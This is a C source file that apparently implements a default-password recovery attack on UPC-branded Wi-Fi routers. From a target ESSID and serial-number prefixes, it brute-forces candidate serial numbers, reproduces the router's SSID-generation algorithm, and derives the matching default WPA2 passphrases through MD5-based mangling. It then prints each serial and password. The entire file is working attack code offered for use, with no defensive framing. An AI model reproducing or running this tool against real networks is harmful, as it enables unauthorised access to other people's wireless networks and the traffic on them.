#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define COMMON_DIGEST_FOR_OPENSSL
// minor hack to work with CommonCrypto
#include <CommonCrypto/commonDigest.h>
#include <CommonCrypto/CommonDigest.h>

#define MAGIC_24GHZ 0xff8d8f20
#define MAGIC_5GHZ 0xffd9da60
#define MAGIC0 0xb21642c9ll
#define MAGIC1 0x68de3afll
#define MAGIC2 0x6b5fca6bll

#define MAX0 9
#define MAX1 99
#define MAX2 9
#define MAX3 9999

#define PREFIX_DELIMITER ","

void hash2pass(uint8_t *in_hash, char *out_pass) {
    uint32_t i, a;

    for (i = 0; i < 8; i++) {
        a = in_hash[i] & 0x1f;
        a -= ((a * MAGIC0) >> 36) * 23;

        a = (a & 0xff) + 0x41;

        if (a >= 'I') a++;
        if (a >= 'L') a++;
        if (a >= 'O') a++;

        out_pass[i] = a;
    }
    out_pass[8] = 0;
}

uint32_t mangle(uint32_t *pp) {
    uint32_t a, b;

    a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
    b = (pp[3] - a * 9999 + 1) * 11ll;

    return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
}

uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic) {
    uint32_t a, b;

    a = data[1] * 10 + data[2];
    b = data[0] * 2500000 + a * 6800 + data[3] + magic;

    return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
}

void usage(char *prog) {
    fprintf(stderr, "  Usage: %s <ESSID> <PREFIXES>\n", prog);
    fprintf(stderr, "   - ESSID should be in 'UPCxxxxxxx' format\n");
    fprintf(stderr, "   - PREFIXES should be a string of comma separated serial number prefixes\n\n");
}

int main(int argc, char *argv[]) {
    uint32_t buf[4], target;
    char serial[64];
    char serial_input[64];
    char pass[9], tmpstr[17];
    uint8_t h1[16], h2[16];
    uint32_t hv[4], w1, w2, i;
    int mode;
    char *prefix;

    if(argc != 3) {
        usage(argv[0]);
        return 1;
    }

    if (strlen(argv[1]) != 10 || memcmp(argv[1], "UPC", 3) != 0) {
        usage(argv[0]);
        return 1;
    }

    char prefixes[strlen(argv[2]) + 1];
    target = strtoul(argv[1] + 3, NULL, 0);

    MD5_CTX ctx;

    for (buf[0] = 0; buf[0] <= MAX0; buf[0]++)
        for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
            for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
                for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
                    mode = 0;
                    if (upc_generate_ssid(buf, MAGIC_24GHZ) == target) {
                        mode = 1;
                    }
                    if (upc_generate_ssid(buf, MAGIC_5GHZ) == target) {
                        mode = 2;
                    }
                    if (mode != 1 && mode != 2) {
                        continue;
                    }

                    strcpy(prefixes, argv[2]);
                    prefix = strtok(prefixes, PREFIX_DELIMITER);
                    while (prefix != NULL) {
                        sprintf(serial, "%s%d%02d%d%04d", prefix, buf[0], buf[1], buf[2], buf[3]);
                        memset(serial_input, 0, 64);

                        if (mode == 2) {
                            for(i=0; i<strlen(serial); i++) {
                                serial_input[strlen(serial)-1-i] = serial[i];
                            }
                        } else {
                            memcpy(serial_input, serial, strlen(serial));
                        }

                        MD5_Init(&ctx);
                        MD5_Update(&ctx, serial_input, strlen(serial_input));
                        MD5_Final(h1, &ctx);

                        for (i = 0; i < 4; i++) {
                            hv[i] = *(uint16_t *)(h1 + i*2);
                        }

                        w1 = mangle(hv);

                        for (i = 0; i < 4; i++) {
                            hv[i] = *(uint16_t *)(h1 + 8 + i*2);
                        }

                        w2 = mangle(hv);

                        sprintf(tmpstr, "%08X%08X", w1, w2);

                        MD5_Init(&ctx);
                        MD5_Update(&ctx, tmpstr, strlen(tmpstr));
                        MD5_Final(h2, &ctx);

                        hash2pass(h2, pass);
                        printf("%s,%s,%d\n", serial, pass, mode);
                        prefix = strtok(NULL, PREFIX_DELIMITER);
                    }
                }

    return 0;
}
